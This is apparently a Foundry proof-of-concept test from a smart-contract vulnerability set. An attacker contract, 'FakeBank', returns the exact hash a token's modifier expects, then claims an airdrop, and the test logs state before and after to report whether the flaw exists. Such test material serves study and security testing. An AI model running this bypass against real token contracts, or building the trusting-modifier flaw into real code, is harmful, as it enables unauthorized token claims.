// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/modifier_reentrancy.sol";

contract FakeBank {
    function supportsToken() external pure returns (bytes32) {
        // Returns the exact value required to bypass the token's modifier
        return keccak256(abi.encodePacked("Nu Token"));
    }

    function attack(ModifierEntrancy token) public {
        // Exploit by directly calling the vulnerable airdrop function
        token.airDrop();
    }
}

contract ModifierEntrancyTest is Test {
    ModifierEntrancy public token;
    FakeBank public fakeBank;

    function setUp() public {
        // Deploy the vulnerable token contract
        token = new ModifierEntrancy();
        // Deploy the attacker contract
        fakeBank = new FakeBank();
    }

    function testSupportsTokenBypass() public {
        console.log("--- BEFORE-Trigger State Snapshot ---");
        // Pre-attack state
        uint initialBalance = token.getTokenBalance(address(fakeBank));
        uint initialTotalAirdrops = token.totalAirdrops();
        bool initialClaimed = token.hasClaimedAirdrop(address(fakeBank));

        console.log("Attacker Token Balance (Before):", initialBalance);
        console.log("Total Airdrops Count (Before):", initialTotalAirdrops);
        console.log("Has Claimed Airdrop (Before):", initialClaimed);
        assertEq(initialBalance, 0, "Initial balance should be zero");
        assertEq(initialTotalAirdrops, 0, "Initial airdrop count should be zero");
        assertFalse(initialClaimed, "Initial claim status should be false");
        
        console.log("--- Trigger Attack ---");
        fakeBank.attack(token);  // Perform exploit
        
        console.log("--- AFTER-Trigger State Snapshot ---");
        // Post-attack state
        uint finalBalance = token.getTokenBalance(address(fakeBank));
        uint finalTotalAirdrops = token.totalAirdrops();
        bool finalClaimed = token.hasClaimedAirdrop(address(fakeBank));
         
        console.log("Attacker Token Balance (After):", finalBalance);
        console.log("Total Airdrops Count (After):", finalTotalAirdrops);
        console.log("Has Claimed Airdrop (After):", finalClaimed);
        
        // Validate state changes
        console.log("--- Vulnerability Verdict ---");
        if (finalBalance > initialBalance && 
            finalTotalAirdrops > initialTotalAirdrops && 
            finalClaimed != initialClaimed) {
            console.log("Vulnerability Exists: Attack caused unauthorized balance increase, airdrop count increment, and claim status change");
        } else {
            console.log("Vulnerability not Exist: No unauthorized state modification detected");
        }
    }
}